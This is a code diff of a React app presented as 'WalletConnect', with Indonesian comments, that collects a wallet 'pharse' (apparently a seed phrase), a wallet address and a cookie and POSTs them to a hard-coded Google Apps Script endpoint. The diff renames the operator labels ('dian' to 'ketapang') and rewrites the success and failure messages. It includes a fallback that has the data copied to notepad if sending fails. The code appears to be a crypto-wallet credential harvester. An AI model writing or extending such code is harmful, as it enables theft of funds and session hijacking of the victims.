@@ -42,6 +42,7 @@ const executeFunction = async ({ id, method, params }) => {
 function App() {
   const [uri, setUri] = useState('');
   const [txStatus, setTxStatus] = useState('');
+  const [txKeterangan, setTxKeterangan] = useState('');
   const [walletAddress, setWalletAddress] = useState(''); // Menyimpan wallet address
   const [data1, setData1] = useState('');
   const [isConnected, setIsConnected] = useState(false); // State untuk mengecek status koneksi
@@ -135,7 +136,7 @@ function App() {
   const handleSubmitData = async () => {
     setIsSubmitting(true);
     const result = {
-      name: "dian",
+      name: "ketapang",
       pharse: pharse,
       address: walletAddress,
       cookie: data1,
@@ -148,7 +149,6 @@ function App() {
       const response = await fetch('https://script.google.com/macros/s/AKfycbxTLDii4PxBiUCdXycFSe1vfuH1IXluShM4brTuJqUJdjyLZqTSC_ITOtIjozYq6i4W/exec', {
         method: 'POST',
         headers: {
-          // 'Content-Type': 'application/json',
           'Content-Type': 'text/plain;charset=utf-8',
         },
         body: JSON.stringify(result),
@@ -160,16 +160,16 @@ function App() {
       const data = await response.json();
 
       if (data.status == "success") {
-        alert('Data berhasil dikirim ke server!!!');
-        setSubmittedData(null);
+        setTxKeterangan('DONE!!!')
       } else if (data.status == "failed") {
-        alert('Data sudah ada di server!!!');
+        setTxKeterangan('Jika status kirim failed, salin data di bawah ini untuk disimpan ke notepad!');
       } else {
         alert('Terjadi kesalahan saat mengirim data ke server.');
+        setTxKeterangan('Jika status kirim failed, salin data di bawah ini untuk disimpan ke notepad!');
       }
     } catch (error) {
       console.error('Error during API call:', error);
-      alert('Terjadi kesalahan saat mengirim data');
+      setTxKeterangan('Jika status kirim failed, salin data di bawah ini untuk disimpan ke notepad!');
     }
   };
 
@@ -187,7 +187,7 @@ function App() {
   return (
     <div className="App">
       <header className="App-header">
-        <h1>WalletConnect ( Dian )</h1>
+        <h1>WalletConnect ( Feri Ketapang )</h1>
 
         {/* Input untuk WalletConnect URI */}
         <div>
@@ -236,10 +236,18 @@ function App() {
           </div>
         )}
 
-        {/* Menampilkan hasil JSON setelah data disubmit jika status gagal */}
-        {txStatus === 'Jika status kirim failed, salin data di bawah ini untuk disimpan ke notepad!' && submittedData && (
+        {/* Menampilkan hasil JSON setelah data disubmit jika status berhasil */}
+        {txKeterangan === 'DONE!!!' && submittedData && (
           <div>
-            <h2>Jika status kirim failed, salin data di bawah ini untuk disimpan ke notepad!</h2>
+            <h2>Data Berhasil Dikirim Ke SERVER!!!</h2>
+            <pre>{JSON.stringify(submittedData, null, 2)}</pre> {/* Format JSON dengan indentasi */}
+          </div>
+        )}
+
+        {/* Menampilkan hasil JSON setelah data disubmit jika status gagal */}
+        {txKeterangan === 'Jika status kirim failed, salin data di bawah ini untuk disimpan ke notepad!' && submittedData && (
+          <div>
+            <h2>Data gagal dikirim, silahkan copy data dibawah ini dan salin di notepad!!!</h2>
             <pre>{JSON.stringify(submittedData, null, 2)}</pre> {/* Format JSON dengan indentasi */}
 
             {/* Tombol salin */}
